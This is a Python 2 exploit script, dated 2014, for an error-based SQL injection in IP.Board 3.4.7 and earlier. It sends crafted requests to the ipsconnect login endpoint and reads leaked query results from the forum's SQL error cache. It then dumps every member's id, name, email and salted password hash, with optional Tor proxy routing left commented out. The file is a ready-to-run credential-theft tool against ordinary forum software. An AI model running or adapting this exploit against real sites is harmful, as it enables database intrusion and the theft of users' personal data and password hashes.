#!/usr/bin/env python
# Sunday, November 09, 2014 - secthrowaway () safe-mail net
# IP.Board <= 3.4.7 SQLi (blind, error based); 
# you can adapt to other types of blind injection if 'cache/sql_error_latest.cgi' is unreadable

url = 'http://target.tld/forum/'
ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"

import sys, re

# <socks> - http://sourceforge.net/projects/socksipy/
#import socks, socket
#socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
#socket.socket = socks.socksocket
# </socks>

import urllib2, urllib

def inject(sql):
	try:
		urllib2.urlopen(urllib2.Request('%sinterface/ipsconnect/ipsconnect.php' % url, data="act=login&idType=id&id[]=-1&id[]=%s" % urllib.quote('-1) and 1!="\'" and extractvalue(1,concat(0x3a,(%s)))#\'' % sql), headers={"User-agent": ua}))
	except urllib2.HTTPError, e:
		if e.code == 503:
			data = urllib2.urlopen(urllib2.Request('%scache/sql_error_latest.cgi' % url, headers={"User-agent": ua})).read()
			txt = re.search("XPATH syntax error: ':(.*)'", data, re.MULTILINE)
			if txt is not None: 
				return txt.group(1)
			sys.exit('Error [3], received unexpected data:\n%s' % data)
		sys.exit('Error [1]')
	sys.exit('Error [2]')

def get(name, table, num):
	sqli = 'SELECT %s FROM %s LIMIT %d,1' % (name, table, num)
	s = int(inject('LENGTH((%s))' % sqli))
	if s < 31:
		return inject(sqli)
	else:
		r = ''
		for i in range(1, s+1, 31):
			r += inject('SUBSTRING((%s), %i, %i)' % (sqli, i, 31))
		return r

n = inject('SELECT COUNT(*) FROM members')
print '* Found %s users' % n
for j in range(int(n)):	
	print get('member_id', 'members', j)
	print get('name', 'members', j)
	print get('email', 'members', j)
	print get('CONCAT(members_pass_hash, 0x3a, members_pass_salt)', 'members', j)
	print '----------------'
